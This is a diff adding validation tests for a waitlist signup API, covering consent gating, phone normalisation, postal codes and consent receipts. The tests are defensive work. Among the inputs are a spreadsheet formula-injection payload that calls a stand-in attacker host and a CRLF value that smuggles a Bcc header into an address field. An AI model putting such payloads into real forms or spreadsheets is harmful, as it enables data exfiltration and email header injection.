@@ -683,6 +683,146 @@ await check('Error response never echoes submitted input', 'no email in body', a
   return { pass: !body.includes('canary-string'), actual: body };
 });
 
+// 21 — contract extension 2026-08-17
+{
+  const { __resetInMemoryLimiter } = await import('../src/lib/ratelimit.js');
+  __resetInMemoryLimiter();
+  const { validateWaitlist, resolveConsentText, sanitizeForSheet } = await import('../src/lib/validation.js');
+
+  const full = (o = {}) => ({
+    email: `x${Math.random().toString(36).slice(2, 8)}@gmail.com`,
+    consent_marketing: true,
+    consent_text_version: '2026-08-15.marketing.a',
+    form_render_ts: Date.now() - 9000,
+    ...o,
+  });
+
+  // New enums
+  await check('quantity_band valid value accepted', '200', async () => {
+    const r = await post(full({ quantity_band: 'qty_2_3' }));
+    return { pass: r.status === 200, actual: String(r.status) };
+  });
+  await check('quantity_band invalid value rejected', '400', async () => {
+    const r = await post(full({ quantity_band: 'a_lot' }));
+    return { pass: r.status === 400, actual: String(r.status) };
+  });
+  await check('headcount + company + office_interest accepted', '200', async () => {
+    const r = await post(full({ office_interest: true, company: 'Acme AS', headcount: 'hc_11_50' }));
+    return { pass: r.status === 200, actual: String(r.status) };
+  });
+  await check('headcount invalid value rejected', '400', async () => {
+    const r = await post(full({ headcount: '50ish' }));
+    return { pass: r.status === 400, actual: String(r.status) };
+  });
+
+  // *_other pairing
+  await check('motivation_other with "other" selected accepted', '200', async () => {
+    const r = await post(full({ consent_health: true, motivation: ['other'], motivation_other: 'Doctor suggested it', motivation_consent_text_version: '2026-08-15.health.a' }));
+    return { pass: r.status === 200, actual: String(r.status) };
+  });
+  await check('motivation_other WITHOUT "other" selected rejected', '400', async () => {
+    const r = await post(full({ consent_health: true, motivation: ['energy'], motivation_other: 'x' }));
+    return { pass: r.status === 400, actual: String(r.status) };
+  });
+  await check('referral_source_other WITHOUT "other" selected rejected', '400', async () => {
+    const r = await post(full({ referral_source: 'doctor', referral_source_other: 'x' }));
+    return { pass: r.status === 400, actual: String(r.status) };
+  });
+
+  // Free text: sanitising + caps
+  await check('Formula payload in company neutralised', "prefixed with '", async () => {
+    const out = sanitizeForSheet('=IMPORTXML("https://attacker.example","//a")');
+    return { pass: out.startsWith("'"), actual: out.slice(0, 32) + '…' };
+  });
+  await check('Formula payload in motivation_other neutralised', "prefixed with '", async () => {
+    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, consent_health: true, motivation: ['other'], motivation_other: '=1+1' });
+    return { pass: v.ok && sanitizeForSheet(v.data.motivation_other) === "'=1+1", actual: JSON.stringify(sanitizeForSheet(v.data?.motivation_other)) };
+  });
+  await check('company over 120 chars rejected', '400', async () => {
+    const r = await post(full({ company: 'A'.repeat(200) }));
+    return { pass: r.status === 400, actual: String(r.status) };
+  });
+  await check('CRLF in address_line1 rejected', '400', async () => {
+    const r = await post(full({ consent_postal: true, address_line1: 'Storgata 1\r\nBcc: v@e.com', address_city: 'Oslo', address_country: 'NO', postal_consent_text_version: '2026-08-17.postal.a' }));
+    return { pass: r.status === 400, actual: String(r.status) };
+  });
+
+  // Phone — strict, unlike zip
+  await check('Valid E.164 phone accepted and normalised', '+4791234567', async () => {
+    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, phone: '+47 912 34 567', consent_sms: true, sms_consent_text_version: '2026-08-17.sms.a' });
+    return { pass: v.ok && v.data.phone === '+4791234567', actual: JSON.stringify(v.data?.phone ?? v.issues) };
+  });
+  for (const bad of ['12345', '+0912345678', 'not a phone', '+4']) {
+    await check(`Phone "${bad}" rejected (strict, not soft like zip)`, '400', async () => {
+      const r = await post(full({ phone: bad }));
+      return { pass: r.status === 400, actual: String(r.status) };
+    });
+  }
+
+  // Consent gating
+  await check('consent_sms without a phone rejected', '400', async () => {
+    const r = await post(full({ consent_sms: true }));
+    return { pass: r.status === 400, actual: String(r.status) };
+  });
+  await check('consent_postal without an address rejected', '400', async () => {
+    const r = await post(full({ consent_postal: true }));
+    return { pass: r.status === 400, actual: String(r.status) };
+  });
+  await check('Phone supplied WITHOUT sms consent is not stored', 'dropped', async () => {
+    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, phone: '+4791234567' });
+    const stored = v.ok && v.data.consent_sms ? v.data.phone : null;
+    return { pass: v.ok && stored === null, actual: `consent_sms=${v.data?.consent_sms}, stored=${JSON.stringify(stored)}` };
+  });
+  await check('Address supplied WITHOUT postal consent is not stored', 'dropped', async () => {
+    const v = validateWaitlist({ email: 'a@gmail.com', consent_marketing: true, address_line1: 'Storgata 1', address_city: 'Oslo', address_country: 'NO' });
+    const stored = v.ok && v.data.consent_postal ? v.data.address_line1 : null;
+    return { pass: v.ok && stored === null, actual: JSON.stringify(stored) };
+  });
+
+  // International postal code inside the address block — NOT the US-only zip
+  for (const [code, where] of [['0150', 'Norway'], ['SW1A 1AA', 'UK'], ['01000-000', 'Brazil'], ['94305', 'US']]) {
+    await check(`address_postal_code "${code}" (${where}) accepted`, '200', async () => {
+      const r = await post(full({ consent_postal: true, address_line1: 'A 1', address_city: 'C', address_country: 'NO', address_postal_code: code, postal_consent_text_version: '2026-08-17.postal.a' }));
+      return { pass: r.status === 200, actual: String(r.status) };
+    });
+  }
+
+  // Receipt shape
+  await check('Receipt v3 carries all four consents, each with its own version', 'v3', async () => {
+    const names = ['marketing', 'health', 'sms', 'postal'];
+    const resolved = {
+      marketing: resolveConsentText('2026-08-15.marketing.a', 'marketing'),
+      health: resolveConsentText('2026-08-15.health.a', 'health'),
+      sms: resolveConsentText('2026-08-17.sms.a', 'sms'),
+      postal: resolveConsentText('2026-08-17.postal.a', 'postal'),
+    };
+    const distinct = new Set(names.map((n) => resolved[n].version)).size === 4;
+    const allText = names.every((n) => typeof resolved[n].text === 'string' && resolved[n].text.length > 10);
+    const allMatched = names.every((n) => resolved[n].registry_match);
+    return { pass: distinct && allText && allMatched, actual: `distinct=${distinct} text=${allText} registered=${allMatched}` };
+  });
+
+  await check('Server-derived fields still rejected from the client', '400', async () => {
+    const codes = await Promise.all([
+      post(full({ consent_receipt: '{}' })),
+      post(full({ needs_reconsent: false })),
+      post(full({ consent_regime_status: 'ok' })),
+    ]);
+    return { pass: codes.every((r) => r.status === 400), actual: codes.map((r) => r.status).join(',') };
+  });
+
+  await check('Leniency still confined to zip after the extension', '400 on all', async () => {
+    const codes = await Promise.all([
+      post(full({ quantity_band: 'nope' })),
+      post(full({ headcount: 'nope' })),
+      post(full({ address_country: 'NORWAY' })),
+      post(full({ address_postal_code: '!!!' })),
+      post(full({ flavor: 'nope' })),
+    ]);
+    return { pass: codes.every((r) => r.status === 400), actual: codes.map((r) => r.status).join(',') };
+  });
+}
+
 // ─── Report ──────────────────────────────────────────────────────────────────
 
 server.close();
